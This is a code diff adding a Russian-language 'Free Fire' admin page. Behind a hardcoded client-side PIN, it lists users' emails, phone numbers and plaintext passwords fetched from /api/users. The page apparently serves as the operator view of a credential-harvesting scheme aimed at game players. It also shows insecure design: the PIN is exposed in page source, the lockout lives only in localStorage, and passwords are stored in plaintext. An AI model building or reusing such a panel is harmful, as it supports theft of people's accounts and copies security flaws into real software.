@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel - Free Fire</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container admin-container" id="adminContainer">
+        <div id="pinScreen">
+            <h2>🔐 АДМИН-ПАНЕЛЬ</h2>
+            <div class="pin-panel">
+                <div class="pin-display" id="pinDisplay"></div>
+                <div class="pin-buttons" id="pinButtons"></div>
+                <p>Попыток осталось: <span id="attemptsLeft">3</span></p>
+                <button onclick="clearPin()">ОЧИСТИТЬ</button>
+            </div>
+        </div>
+        <div id="adminContent" style="display:none;">
+            <h2>📊 ДАННЫЕ ПОЛЬЗОВАТЕЛЕЙ</h2>
+            <table class="admin-table" id="userTable">
+                <thead>
+                    <tr>
+                        <th>Email</th>
+                        <th>Телефон</th>
+                        <th>Пароль</th>
+                        <th>Время регистрации</th>
+                    </tr>
+                </thead>
+                <tbody id="userTableBody"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        const CORRECT_PIN = '008998013';
+        let currentPin = '';
+        let attempts = 3;
+        let blockedUntil = null;
+
+        function loadBlockStatus() {
+            const blocked = localStorage.getItem('adminBlockedUntil');
+            if (blocked && new Date() < new Date(blocked)) {
+                blockedUntil = new Date(blocked);
+                attempts = 0;
+                document.getElementById('attemptsLeft').innerText = '0 (заблокировано)';
+                disableButtons(true);
+                return true;
+            } else if (blocked) {
+                localStorage.removeItem('adminBlockedUntil');
+                attempts = 3;
+                document.getElementById('attemptsLeft').innerText = '3';
+                disableButtons(false);
+            }
+            return false;
+        }
+
+        function disableButtons(disabled) {
+            document.querySelectorAll('.pin-btn').forEach(btn => btn.disabled = disabled);
+        }
+
+        function saveBlock() {
+            const blockTime = new Date();
+            blockTime.setHours(blockTime.getHours() + 24);
+            localStorage.setItem('adminBlockedUntil', blockTime);
+            blockedUntil = blockTime;
+            disableButtons(true);
+        }
+
+        function createPinButtons() {
+            const container = document.getElementById('pinButtons');
+            for (let i = 0; i <= 9; i++) {
+                const btn = document.createElement('button');
+                btn.textContent = i;
+                btn.className = 'pin-btn';
+                btn.onclick = () => addDigit(i);
+                container.appendChild(btn);
+            }
+        }
+
+        function addDigit(digit) {
+            if (blockedUntil && new Date() < blockedUntil) return;
+            if (currentPin.length < 9) {
+                currentPin += digit;
+                updateDisplay();
+            }
+        }
+
+        function updateDisplay() {
+            document.getElementById('pinDisplay').innerText = currentPin.padEnd(9, '•');
+            if (currentPin.length === 9) {
+                checkPin();
+            }
+        }
+
+        function clearPin() {
+            currentPin = '';
+            updateDisplay();
+        }
+
+        function checkPin() {
+            if (currentPin === CORRECT_PIN) {
+                document.getElementById('pinScreen').style.display = 'none';
+                document.getElementById('adminContent').style.display = 'block';
+                loadUsers();
+            } else {
+                attempts--;
+                document.getElementById('attemptsLeft').innerText = attempts;
+                if (attempts <= 0) {
+                    alert('Пароль неверный. Доступ заблокирован на 24 часа.');
+                    saveBlock();
+                    disableButtons(true);
+                } else {
+                    alert(`Неверный пароль. Осталось попыток: ${attempts}`);
+                }
+                currentPin = '';
+                updateDisplay();
+            }
+        }
+
+        async function loadUsers() {
+            const response = await fetch('/api/users');
+            const users = await response.json();
+            const tbody = document.getElementById('userTableBody');
+            tbody.innerHTML = '';
+            users.forEach(user => {
+                const row = tbody.insertRow();
+                row.insertCell(0).textContent = user.email;
+                row.insertCell(1).textContent = user.phone;
+                
+                const passCell = row.insertCell(2);
+                const passSpan = document.createElement('span');
+                passSpan.textContent = '••••••••';
+                passSpan.style.cursor = 'pointer';
+                
+                const eyeSpan = document.createElement('span');
+                eyeSpan.textContent = ' 👁️';
+                eyeSpan.style.cursor = 'pointer';
+                eyeSpan.style.marginLeft = '5px';
+                
+                let visible = false;
+                eyeSpan.onclick = () => {
+                    if (visible) {
+                        passSpan.textContent = '••••••••';
+                        visible = false;
+                    } else {
+                        passSpan.textContent = user.password;
+                        visible = true;
+                    }
+                };
+                
+                passCell.appendChild(passSpan);
+                passCell.appendChild(eyeSpan);
+                row.insertCell(3).textContent = user.timestamp;
+            });
+        }
+
+        createPinButtons();
+        loadBlockStatus();
+    </script>
+</body>
+</html>
